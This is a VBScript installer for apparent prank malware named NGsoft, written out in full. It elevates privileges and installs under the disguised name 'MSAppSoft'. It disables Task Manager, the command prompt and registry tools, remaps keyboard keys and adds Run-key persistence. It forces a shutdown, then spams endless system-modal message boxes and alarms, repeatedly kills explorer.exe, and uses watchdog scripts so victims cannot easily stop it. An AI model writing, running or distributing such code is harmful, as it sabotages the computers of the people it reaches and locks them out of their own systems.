Option Explicit
Dim fso, sh, DEST, build, f, needElev, ie

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
DEST  = sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\MSAppSoft"
build = sh.ExpandEnvironmentStrings("%TEMP%") & "\ngsbuild"

' ---- elevation check ----
On Error Resume Next
Err.Clear
If Not fso.FolderExists(DEST) Then fso.CreateFolder DEST
Set f = fso.CreateTextFile(DEST & "\.wtest", True)
If Err.Number = 0 Then f.Close
needElev = (Err.Number <> 0)
On Error GoTo 0

If needElev Then
    sh.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
    WScript.Quit
End If

On Error Resume Next
fso.DeleteFile DEST & "\.wtest", True
On Error GoTo 0

If fso.FolderExists(build) Then fso.DeleteFolder build, True
fso.CreateFolder build

' ============================================================ generate
W DEST & "\Start.bat", Join(Array( _
"@echo off", _
"setlocal enabledelayedexpansion", _
"title Start", _
"set ""DEST=%~dp0""", _
"cd /d ""%DEST%""", _
"", _
"set N=0", _
"for /f %%c in ('tasklist /v /fi ""imagename eq cmd.exe"" 2^>nul ^| find /c /i ""Start""') do set N=%%c", _
"if not defined N set N=0", _
"if %N% GTR 1 exit /b", _
"", _
"if exist ""%DEST%\phase1.done"" goto phase2", _
"", _
"for /l %%i in (1,1,50) do call :mklol %%i", _
"call :wall", _
"call :cursor", _
"call :colors", _
"> ""%DEST%\phase1.done"" echo done", _
"shutdown -s -f -t 0", _
"exit /b", _
"", _
":mklol", _
"set ""FN=lol.txt""", _
"if not ""%~1""==""1"" set ""FN=lol (%~1).txt""", _
">""%USERPROFILE%\Desktop\%FN%"" echo lol", _
"if defined PUBLIC if exist ""%PUBLIC%\Desktop"" >""%PUBLIC%\Desktop\%FN%"" echo lol", _
"exit /b", _
"", _
":wall", _
"reg add ""HKCU\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d ""%DEST%RedWallPaper.bmp"" /f", _
"reg add ""HKCU\Control Panel\Desktop"" /v WallpaperStyle /t REG_SZ /d ""2"" /f", _
"reg add ""HKCU\Control Panel\Desktop"" /v TileWallpaper /t REG_SZ /d ""0"" /f", _
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v Wallpaper /t REG_SZ /d ""%DEST%RedWallPaper.bmp"" /f", _
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v WallpaperStyle /t REG_SZ /d ""2"" /f", _
"exit /b", _
"", _
":cursor", _
"reg add ""HKCU\Control Panel\Cursors"" /ve /t REG_EXPAND_SZ /d ""N (system scheme)"" /f", _
"for %%a in (Arrow Help AppStarting Wait Crosshair IBeam NWPen No SizeNS SizeWE SizeNWSE SizeNESW SizeAll UpArrow Hand) do reg add ""HKCU\Control Panel\Cursors"" /v %%a /t REG_EXPAND_SZ /d ""%DEST%NCursor.cur"" /f", _
"exit /b", _
"" _
), vbCrLf) & vbCrLf & Join(Array( _
":colors", _
"reg add ""HKCU\Control Panel\Colors"" /v ActiveTitle /t REG_SZ /d ""0 0 255"" /f", _
"reg add ""HKCU\Control Panel\Colors"" /v GradientActiveTitle /t REG_SZ /d ""0 0 255"" /f", _
"reg add ""HKCU\Control Panel\Colors"" /v InactiveTitle /t REG_SZ /d ""0 0 128"" /f", _
"reg add ""HKCU\Control Panel\Colors"" /v TitleText /t REG_SZ /d ""255 255 255"" /f", _
"reg add ""HKCU\Software\Microsoft\Windows\DWM"" /v AccentColor /t REG_DWORD /d 4292114432 /f", _
"reg add ""HKCU\Software\Microsoft\Windows\DWM"" /v ColorizationColor /t REG_DWORD /d 3288365268 /f", _
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"" /v ColorPrevalence /t REG_DWORD /d 1 /f", _
"exit /b", _
"", _
":phase2", _
"if /i not ""%~1""==""resume"" (", _
"    del ""%DEST%\hb1.tmp"" ""%DEST%\hb2.tmp"" ""%DEST%\lol.run"" 2>nul", _
"    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" notice", _
"    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" alarm", _
")", _
"if not exist ""%DEST%\hb2.tmp"" start """" ""%DEST%\ImNGsoft.exe""", _
"if not exist ""%DEST%\lol.run"" (", _
"    >""%DEST%\lol.run"" echo .", _
"    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" lol", _
")", _
"", _
":loop", _
">""%DEST%\hb1.tmp"" echo .", _
"tasklist /v /fi ""imagename eq cmd.exe"" 2>nul | find /i ""CheckSoft"" >nul || start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\CheckSoft.bat""", _
"ping -n 6 127.0.0.1 >nul", _
"goto loop" _
), vbCrLf) & vbCrLf

W DEST & "\CheckSoft.bat", Join(Array( _
"@echo off", _
"title CheckSoft", _
"set ""DEST=%~dp0""", _
"cd /d ""%DEST%""", _
"set N=0", _
"ping -n 3 127.0.0.1 >nul", _
"for /f %%c in ('tasklist /v /fi ""imagename eq cmd.exe"" 2^>nul ^| find /c /i ""CheckSoft""') do set N=%%c", _
"if not defined N set N=0", _
"if %N% GTR 1 exit /b", _
":loop", _
"del ""%DEST%\hb1.tmp"" 2>nul", _
"del ""%DEST%\hb2.tmp"" 2>nul", _
"ping -n 8 127.0.0.1 >nul", _
"if not exist ""%DEST%\hb1.tmp"" start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\Start.bat"" resume", _
"if not exist ""%DEST%\hb2.tmp"" start """" ""%DEST%\ImNGsoft.exe""", _
"taskkill /f /im explorer.exe >nul 2>nul", _
"ping -n 4 127.0.0.1 >nul", _
"tasklist /fi ""imagename eq explorer.exe"" 2>nul | find /i ""explorer"" >nul || start """" explorer.exe", _
"ping -n 56 127.0.0.1 >nul", _
"goto loop" _
), vbCrLf) & vbCrLf

W DEST & "\payload.vbs", Join(Array( _
"Option Explicit", _
"Dim m, sh, fso, p, wav, cmd, i, ok", _
"If WScript.Arguments.Count = 0 Then WScript.Quit", _
"m = LCase(WScript.Arguments(0))", _
"Set sh = CreateObject(""WScript.Shell"")", _
"Set fso = CreateObject(""Scripting.FileSystemObject"")", _
"Select Case m", _
"Case ""hide""", _
"    If WScript.Arguments.Count < 2 Then WScript.Quit", _
"    cmd = """""" & WScript.Arguments(1) & """"""", _
"    For i = 2 To WScript.Arguments.Count - 1", _
"        cmd = cmd & "" """" & WScript.Arguments(i) & """"""", _
"    Next", _
"    sh.Run cmd, 0, False", _
"Case ""notice""", _
"    MsgBox ""Reboot detected."" & vbCrLf & vbCrLf & ""Phase 2 begins. There is no escape."", vbInformation + vbSystemModal, ""NGsoft1.0""", _
"Case ""lol""", _
"    Do", _
"        MsgBox ""lol"", vbExclamation + vbSystemModal, ""lol""", _
"    Loop", _
"Case ""alarm""", _
"    On Error Resume Next", _
"    wav = sh.ExpandEnvironmentStrings(""%SystemRoot%\Media\chord.wav"")", _
"    If fso.FileExists(wav) Then", _
"        Set p = CreateObject(""WMPlayer.OCX"")", _
"        If Err.Number = 0 Then", _
"            p.settings.setMode ""loop"", True", _
"            p.URL = wav", _
"            p.controls.play", _
"            ok = True", _
"        End If", _
"    End If", _
"    On Error GoTo 0", _
"    If ok Then", _
"        Do", _
"            WScript.Sleep 1000", _
"        Loop", _
"    End If", _
"    Do", _
"        Beep", _
"        WScript.Sleep 400", _
"    Loop", _
"End Select" _
), vbCrLf) & vbCrLf

W build & "\ImNGsoft.hta", Join(Array( _
"<html>", _
"<head>", _
"<hta:application id=""ng"" caption=""no"" border=""none"" scroll=""no"" innerborder=""no"" selection=""no"" maximizebutton=""no"" contextmenu=""no"" />", _
"<style>", _
"html,body{margin:0;overflow:hidden;background:#c00000;font-family:""MS Gothic"",monospace}", _
"#t{writing-mode:tb-rl;color:#fff;font-size:60px;font-weight:bold;letter-spacing:6px}", _
"</style>", _
"</head>", _
"<body><div id=""t"">NG!NG!NG</div>", _
"<script>", _
"var W=130,H=470,x=120,y=120,dx=6,dy=4,n=0,mx=0,my=0;", _
"var p=unescape(location.pathname).replace(/^\//,"""").replace(/\//g,""\\"");", _
"var dir=p.substring(0,p.lastIndexOf(""\\""));", _
"window.resizeTo(W,H);", _
"mx=Math.max(0,screen.availWidth-W); my=Math.max(0,screen.availHeight-H);", _
"function tick(){", _
"  x+=dx; y+=dy;", _
"  if(x<0){x=0;dx=-dx;} else if(x>mx){x=mx;dx=-dx;}", _
"  if(y<0){y=0;dy=-dy;} else if(y>my){y=my;dy=-dy;}", _
"  window.moveTo(x,y);", _
"  if(++n%25==0){", _
"    try{", _
"      var fso=new ActiveXObject(""Scripting.FileSystemObject"");", _
"      var f=fso.CreateTextFile(fso.BuildPath(dir,""hb2.tmp""),true); f.Write("".""); f.Close();", _
"    }catch(e){}", _
"  }", _
"}", _
"setInterval(tick,40);", _
"</script>", _
"</body></html>" _
), vbCrLf) & vbCrLf

W build & "\ImNGsoft.sed", Join(Array( _
"[Version]", _
"Class=IEXPRESS", _
"SEDVersion=3", _
"[Options]", _
"PackagePurpose=InstallApp", _
"ShowInstallProgramWindow=0", _
"HideExtractAnimation=1", _
"UseLongFileName=1", _
"InsideCompressed=0", _
"CAB_FixedSize=0", _
"CAB_ResvCodeSigning=0", _
"RebootMode=N", _
"InstallPrompt=", _
"DisplayLicense=", _
"FinishMessage=", _
"TargetName=ImNGsoft.exe", _
"FriendlyName=ImNGsoft", _
"AppLaunched=mshta.exe ImNGsoft.hta", _
"PostInstallCmd=<None>", _
"AppDir=", _
"FILE0=ImNGsoft.hta", _
"[Strings]" _
), vbCrLf) & vbCrLf

MakeBmp DEST & "\RedWallPaper.bmp"
MakeCur DEST & "\NCursor.cur"

' ============================================================ assemble
ie = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\iexpress.exe"
If Not fso.FileExists(ie) Then ie = "iexpress"
sh.CurrentDirectory = build
On Error Resume Next
sh.Run """" & ie & """ /n /q ImNGsoft.sed", 0, True
On Error GoTo 0
If fso.FileExists(build & "\ImNGsoft.exe") Then fso.CopyFile build & "\ImNGsoft.exe", DEST & "\ImNGsoft.exe", True

' ============================================================ registry
Dim PS, PE, RK, KL
PS = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
PE = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
RK = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
KL = "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout"

sh.RegWrite PS & "\DisableTaskMgr", 1, "REG_DWORD"
sh.RegWrite PS & "\DisableCMD", 2, "REG_DWORD"
sh.RegWrite PS & "\DisableRegistryTools", 1, "REG_DWORD"
sh.RegWrite PS & "\NoDispBackgroundPage", 1, "REG_DWORD"
sh.RegWrite PS & "\NoChangingWallpaper", 1, "REG_DWORD"
sh.RegWrite PS & "\NoDispAppearancePage", 1, "REG_DWORD"
sh.RegWrite PE & "\NoControlPanel", 1, "REG_DWORD"
sh.RegWrite PE & "\NoViewContextMenu", 1, "REG_DWORD"

sh.RegWrite KL & "\Scancode Map", Array(0,0,0,0, 0,0,0,0, 6,0,0,0, &H22,0,&H31,0, &H31,0,&H22,0, &H18,0,&H26,0, &H26,0,&H18,0, 0,0,&H3A,0, 0,0,0,0), "REG_BINARY"

sh.RegWrite RK & "\MSAppSoft", "wscript.exe """ & DEST & "\payload.vbs"" hide """ & DEST & "\Start.bat"""
sh.RegWrite RK & "\MSAppSoftChk", "wscript.exe """ & DEST & "\payload.vbs"" hide """ & DEST & "\CheckSoft.bat"""

sh.Run "rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True", 0, True

' ============================================================ cleanup + run
On Error Resume Next
fso.DeleteFolder build, True
On Error GoTo 0
sh.Run "cmd /c """ & DEST & "\Start.bat""", 0, False

' ============================================================ parts
Sub W(path, text)
    Dim st
    Set st = CreateObject("ADODB.Stream")
    st.Type = 2
    st.Charset = "Shift_JIS"
    st.Open
    st.Write text
    st.SaveToFile path, 2
    st.Close
End Sub

Sub MakeBmp(path)
    Dim st, row, i
    row = String(1024, Chr(0)) & String(1024, Chr(0)) & String(1024, Chr(255))
    Set st = CreateObject("ADODB.Stream")
    st.Type = 2
    st.Charset = "iso-8859-1"
    st.Open
    st.Write "BM" & L32(54 + 1024*768*3) & L32(0) & L32(54) & L32(40) & L32(1024) & L32(768) & _
             Chr(1) & Chr(0) & Chr(24) & Chr(0) & L32(0) & L32(1024*768*3) & L32(2835) & L32(2835) & L32(0) & L32(0)
    For i = 1 To 768
        st.Write row
    Next
    st.SaveToFile path, 2
    st.Close
End Sub

Sub MakeCur(path)
    Dim st, y, s
    Set st = CreateObject("ADODB.Stream")
    st.Type = 2
    st.Charset = "iso-8859-1"
    st.Open
    ' ICONDIR: reserved=0, type=2(cursor), count=1
    st.Write Chr(0) & Chr(0) & Chr(2) & Chr(0) & Chr(1) & Chr(0)
    ' ICONDIRENTRY: 32x32, colors=0, reserved=0, hotspot=(16,16), bytes=304, offset=22
    st.Write Chr(32) & Chr(32) & Chr(0) & Chr(0) & L16(16) & L16(16) & L32(304) & L32(22)
    ' BITMAPINFOHEADER: 32x64, 1bpp, imageSize=256
    st.Write L32(40) & L32(32) & L32(64) & Chr(1) & Chr(0) & Chr(1) & Chr(0) & L32(0) & L32(256) & L32(0) & L32(0) & L32(0) & L32(0)
    ' palette: black, white
    st.Write Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(255) & Chr(255) & Chr(255) & Chr(0)
    For y = 0 To 31
        s = String(32, ".")
        If y >= 13 And y <= 18 Then s = String(32, "#")
        Mid(s, 15, 4) = "####"
        st.Write RowBits(s)
    Next
    For y = 0 To 31
        s = String(32, ".")
        If y >= 13 And y <= 18 Then s = String(32, "#")
        Mid(s, 15, 4) = "####"
        st.Write RowBits(s)
    Next
    st.SaveToFile path, 2
    st.Close
End Sub

Function RowBits(s)
    Dim c, v, k, acc
    acc = ""
    For k = 1 To 4
        v = 0
        For c = 0 To 7
            v = v * 2
            If Mid(s, (k-1)*8 + c + 1, 1) = "." Then v = v + 1
        Next
        acc = acc & Chr(v)
    Next
    RowBits = acc
End Function

Function L16(n)
    L16 = Chr(n And 255) & Chr((n\256) And 255)
End Function

Function L32(n)
    L32 = Chr(n And 255) & Chr((n\256) And 255) & Chr((n\65536) And 255) & Chr((n\16777216) And 255)
End Function
